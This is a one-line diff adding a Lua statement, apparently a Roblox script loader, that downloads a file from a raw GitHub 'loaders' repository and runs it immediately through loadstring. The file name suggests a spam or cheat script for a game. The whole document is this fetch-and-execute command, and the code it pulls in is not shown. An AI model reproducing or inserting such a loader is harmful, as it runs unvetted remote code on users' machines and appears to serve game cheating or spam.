@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/makeup-star-spam2-wmau0zdzjop6q5.lua"))()
